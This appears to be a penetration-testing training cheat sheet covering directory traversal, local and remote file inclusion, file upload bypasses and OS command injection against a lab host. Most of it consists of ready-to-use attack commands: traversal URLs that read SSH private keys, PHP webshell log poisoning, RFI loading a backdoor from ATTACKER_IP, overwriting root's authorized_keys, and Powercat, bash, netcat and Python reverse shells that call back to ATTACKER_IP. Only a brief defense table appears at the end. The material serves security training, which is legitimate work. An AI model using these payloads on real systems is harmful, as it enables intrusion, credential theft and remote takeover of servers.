# Common Web Application Attacks - Cheat Sheet & Walkthrough

## Table of Contents
1. [Directory Traversal](#1-directory-traversal)
2. [File Inclusion Vulnerabilities](#2-file-inclusion-vulnerabilities)
3. [File Upload Vulnerabilities](#3-file-upload-vulnerabilities)
4. [Command Injection](#4-command-injection)
5. [Quick Reference](#5-quick-reference)

---

## 1. Directory Traversal

### 1.1 Absolute vs Relative Paths

| Path Type | Description | Example |
|-----------|-------------|---------|
| **Absolute** | Full path from root | `/etc/passwd` |
| **Relative** | Path relative to current directory | `../../etc/passwd` |

#### Linux Path Navigation
```bash
# Current directory
pwd
/home/kali

# Go up one directory
ls ../
# Lists /home

# Go up to root
ls ../../
# Lists root (/, /etc, /home, etc.)

# Access /etc/passwd from anywhere
cat /etc/passwd           # Absolute path
cat ../../etc/passwd      # Relative path
cat ../../../../../../../../../etc/passwd  # Extra ../ works too
```

#### Key Concepts
- Root directory: `/` (Linux) or `C:\` (Windows)
- `../` = Move up one directory
- Extra `../` beyond root are ignored
- Windows uses `..\` as path separator

---

### 1.2 Identifying Directory Traversal

#### Finding Vulnerable Parameters
Look for parameters that reference files:
```
http://example.com/page.php?file=about.html
http://example.com/index.php?language=en.php
http://example.com/download.php?doc=report.pdf
http://example.com/view.php?img=photo.jpg
```

#### Testing Steps

**1. Check for file inclusion behavior**:
```
http://mountaindesserts.local/meteor/index.php?page=admin.php
```

**2. Test with ../ sequences**:
```
http://mountaindesserts.local/meteor/index.php?page=../../../../../../../../../etc/passwd
```

**3. Check for URL encoding bypass**:
```
# Encode dots: . = %2e
http://mountaindesserts.local/cgi-bin/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

---

### 1.3 Exploiting Directory Traversal

#### Common Target Files

| Linux Files | Windows Files |
|-------------|---------------|
| `/etc/passwd` | `C:\Windows\System32\drivers\etc\hosts` |
| `/etc/shadow` | `C:\inetpub\wwwroot\web.config` |
| `/etc/hosts` | `C:\inetpub\logs\LogFiles\W3SVC1\` |
| `/home/user/.ssh/id_rsa` | `C:\Windows\win.ini` |
| `/var/log/apache2/access.log` | `C:\xampp\apache\logs\access.log` |

#### Example: Reading SSH Private Key
```bash
# URL
http://mountaindesserts.local/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa

# Using curl
curl http://mountaindesserts.local/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

#### Using the Stolen Key
```bash
# Fix permissions
chmod 400 dt_key

# Connect via SSH
ssh -i dt_key -p 2222 offsec@mountaindesserts.local
```

---

### 1.4 URL Encoding for Bypass

#### Common Encodings

| Character | Encoded | Character | Encoded |
|-----------|---------|-----------|---------|
| `.` | `%2e` | `/` | `%2f` |
| `..` | `%2e%2e` | `\` | `%5c` |
| `../` | `%2e%2e%2f` | `..\` | `%2e%2e%5c` |

#### Example: Apache 2.4.49 Directory Traversal
```bash
# Fails with plain ../
curl http://192.168.50.16/cgi-bin/../../../../etc/passwd

# Succeeds with URL encoding
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

#### Bypass Techniques
1. **Double encoding**: `%252e%252e%252f`
2. **Unicode encoding**: `%c0%ae%c0%ae%c0%af`
3. **Mixed case**: `%2E%2E%2F`
4. **Null byte**: `../../../etc/passwd%00.jpg`

---

## 2. File Inclusion Vulnerabilities

### Difference: Directory Traversal vs File Inclusion

| Directory Traversal | File Inclusion |
|---------------------|----------------|
| Reads file contents | Includes file in running code |
| Non-executable files only | Executable files are **executed** |
| `view-source` effect | Code executes on server |

---

### 2.1 Local File Inclusion (LFI)

#### LFI to RCE via Log Poisoning

**Step 1: Identify Log File**
```bash
# Use directory traversal to check log
curl http://mountaindesserts.local/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
```

**Step 2: Poison the Log**
```bash
# PHP snippet to execute commands
<?php echo system($_GET['cmd']); ?>

# Send via User-Agent (Burp Repeater)
GET /meteor/index.php?page=admin.php HTTP/1.1
Host: mountaindesserts.local
User-Agent: <?php echo system($_GET['cmd']); ?>
```

**Step 3: Include the Log**
```
http://mountaindesserts.local/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls
```

**Step 4: Get Reverse Shell**
```bash
# URL encoded payload
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261%22
```

#### LFI on Windows
```
Log path: C:\xampp\apache\logs\access.log
URL: http://target/index.php?page=../../../../../../../../xampp/apache/logs/access.log
```

---

### 2.2 PHP Wrappers

#### php://filter - Read Any File
```bash
# Read PHP file (code executes by default)
curl http://mountaindesserts.local/meteor/index.php?page=admin.php

# Read PHP file contents (base64 encoded)
curl http://mountaindesserts.local/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php

# Decode
echo "PCFET0NUWVBFIGh0bWw..." | base64 -d
```

**Use Cases**:
- Read source code of PHP files
- Extract database credentials
- Find hardcoded passwords
- Understand application logic

#### data:// - Code Execution
```bash
# Direct PHP execution
curl "http://target/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"

# Base64 encoded
curl "http://target/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

**Note**: Requires `allow_url_include = On` in php.ini

---

### 2.3 Remote File Inclusion (RFI)

#### Setup Remote Server
```bash
# Serve webshell from Kali
cd /usr/share/webshells/php/
python3 -m http.server 80
```

#### Exploit RFI
```bash
# Include remote file and execute commands
curl "http://mountaindesserts.local/meteor/index.php?page=http://ATTACKER_IP/simple-backdoor.php&cmd=ls"
```

#### RFI Restrictions
- Requires `allow_url_include = On`
- Requires `allow_url_fopen = On`
- Less common in modern PHP

---

## 3. File Upload Vulnerabilities

### 3.1 Using Executable Files

#### File Upload Flow
```
1. Identify upload form
2. Test with innocent file (test.txt)
3. Try uploading webshell
4. Bypass filters if blocked
5. Access uploaded file
6. Execute commands
```

#### Bypass Techniques

| Technique | Example | Reason |
|-----------|---------|--------|
| **Double extension** | `shell.php.jpg` | Server may process last extension |
| **Case manipulation** | `shell.pHP`, `shell.PhP` | Case-sensitive filters |
| **Alternative extensions** | `shell.php5`, `shell.php7`, `shell.phtml` | Older PHP versions support |
| **Null byte** | `shell.php%00.jpg` | Truncates filename |
| **MIME type spoof** | `Content-Type: image/jpeg` | Server checks MIME only |
| **Magic bytes** | Add `GIF89a;` at start | Server checks file signature |

#### Example: PHP Upload Bypass
```bash
# Original blocked
simple-backdoor.php

# Bypass with case change
simple-backdoor.pHP  # Works!
```

#### Kali Webshells Location
```bash
/usr/share/webshells/
├── asp/
├── aspx/
├── cfm/
├── jsp/
├── perl/
└── php/
    └── simple-backdoor.php
```

#### Get Reverse Shell via Upload
```bash
# 1. Upload webshell
# 2. Execute commands
curl http://target/uploads/shell.pHP?cmd=dir

# 3. PowerShell reverse shell (base64 encoded)
curl http://target/uploads/shell.pHP?cmd=powershell%20-enc%20BASE64_PAYLOAD
```

---

### 3.2 Using Non-Executable Files

#### Strategy: Overwrite Files with Directory Traversal

**Step 1: Generate SSH Key**
```bash
ssh-keygen -f fileup
cat fileup.pub > authorized_keys
```

**Step 2: Upload with Path Traversal**
```
Filename: ../../../../../../../root/.ssh/authorized_keys
```

**Step 3: Connect via SSH**
```bash
chmod 600 fileup
ssh -i fileup -p 2222 root@target
```

**Important Considerations**:
- Blind exploitation - no feedback
- May cause system disruption
- Test on non-production first
- Need to guess user/home paths

#### Windows Overwrite Targets
```
C:\Users\Administrator\.ssh\authorized_keys
C:\ProgramData\ssh\administrator_authorized_keys
C:\inetpub\wwwroot\web.config
C:\Windows\System32\drivers\etc\hosts
```

---

## 4. Command Injection

### 4.1 OS Command Injection

#### Identifying Command Injection
Look for applications that:
- Execute system commands
- Use user input in commands
- Display command output

**Example**:
```
Application: Clone Git repository
Input: git clone https://github.com/user/repo.git
Vulnerability: User input goes directly to OS
```

#### Testing for Injection
```bash
# Test base command
curl -X POST --data 'Archive=git' http://target:8000/archive

# Test with semicolon
curl -X POST --data 'Archive=git%3Bipconfig' http://target:8000/archive

# Test with && 
curl -X POST --data 'Archive=git%26%26ipconfig' http://target:8000/archive
```

#### Command Injection Payloads

| Linux | Windows (CMD) | Windows (PowerShell) |
|-------|---------------|---------------------|
| `;` | `&` | `;` |
| `&&` | `&&` | `&&` |
| `\|\|` | `\|\|` | `\|\|` |
| `\|` | `\|` | `\|` |
| `\n` | `\n` | `` ` `` |

#### Detect Execution Environment
```bash
# PowerShell detection snippet
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

# URL encoded
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://target:8000/archive
```

---

### 4.2 Reverse Shell via Command Injection

#### PowerShell Reverse Shell (Powercat)

**Step 1: Serve Powercat**
```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
```

**Step 2: Start Listener**
```bash
nc -nvlp 4444
```

**Step 3: Inject Payload**
```bash
# Command to download and execute Powercat
IEX (New-Object System.Net.Webclient).DownloadString("http://ATTACKER_IP/powercat.ps1");powercat -c ATTACKER_IP -p 4444 -e powershell

# URL encoded
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2FATTACKER_IP%2Fpowercat.ps1%22)%3Bpowercat%20-c%20ATTACKER_IP%20-p%204444%20-e%20powershell' http://target:8000/archive
```

#### Linux Reverse Shell via Command Injection
```bash
# Bash reverse shell
bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"

# URL encoded
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261%22

# With netcat
nc -e /bin/bash ATTACKER_IP 4444

# Python one-liner
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

---

### 4.3 Command Injection Prevention Bypasses

| Filter | Bypass |
|--------|--------|
| `git` check | `git;command`, `git%26%26command` |
| Spaces blocked | Use `%20`, `$IFS`, `{cmd,args}` |
| `;` blocked | Use `&&`, `||`, `\n`, `%0a` |
| `.` blocked | Use `$PATH` substitution |
| `/` blocked | Use `$HOME`, `~` |

---

## 5. Quick Reference

### Attack Summary Table

| Attack | Goal | Key Techniques |
|--------|------|----------------|
| **Directory Traversal** | Read arbitrary files | `../`, URL encoding |
| **LFI** | Execute local files | Log poisoning, PHP wrappers |
| **RFI** | Execute remote files | Include remote webshell |
| **File Upload** | Execute code | Bypass filters, webshells |
| **Command Injection** | Execute OS commands | Delimiters, encoding |

### Common URLs for Testing

```
# Directory Traversal
http://target/index.php?page=../../../../../../../../../etc/passwd

# LFI Log Poisoning
http://target/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=id

# PHP Wrapper
http://target/index.php?page=php://filter/convert.base64-encode/resource=config.php

# RFI
http://target/index.php?page=http://ATTACKER_IP/shell.php&cmd=id

# File Upload
http://target/uploads/shell.pHP?cmd=id

# Command Injection
http://target:8000/archive -X POST -d 'Archive=git;id'
```

### Quick Commands

```bash
# Curl with encoding
curl "http://target/index.php?page=../../../../../../../../../etc/passwd"

# Curl with data
curl -X POST --data 'param=value' http://target

# Curl with headers
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target

# Start Python web server
python3 -m http.server 80

# Netcat listener
nc -nvlp 4444

# SSH with key
ssh -i key -p 2222 user@target

# Base64 encode
echo -n 'payload' | base64

# Base64 decode
echo 'base64_string' | base64 -d
```

### Key Takeaways

| Vulnerability | Best Exploit Path |
|---------------|-------------------|
| Directory Traversal | SSH keys, config files |
| LFI | Log poisoning → RCE |
| RFI | Remote webshell → RCE |
| File Upload | Webshell → RCE |
| Command Injection | Reverse shell |

### Warning Signs to Look For

- File parameters in URLs
- System command outputs displayed
- File upload forms
- Git clone, ping, traceroute functions
- Error messages revealing paths

### Defensive Mindset

| Attack | Defense |
|--------|---------|
| Directory Traversal | Input validation, chroot |
| LFI/RFI | Disable allow_url_include |
| File Upload | Validate MIME, extension, content |
| Command Injection | Use prepared APIs, whitelist |

---

## Resource List

### Tools Used
- **Burp Suite**: Proxy, Repeater, Intruder
- **curl**: Manual HTTP requests
- **Gobuster**: Directory/fuzzing
- **nmap**: Initial enumeration
- **Netcat**: Reverse shells
- **Python http.server**: File serving

### Wordlists Location
```bash
/usr/share/wordlists/
├── dirb/
│   ├── common.txt
│   ├── big.txt
│   └── small.txt
├── rockyou.txt
└── seclists/

/usr/share/webshells/
├── php/
├── asp/
├── aspx/
├── jsp/
└── perl/
```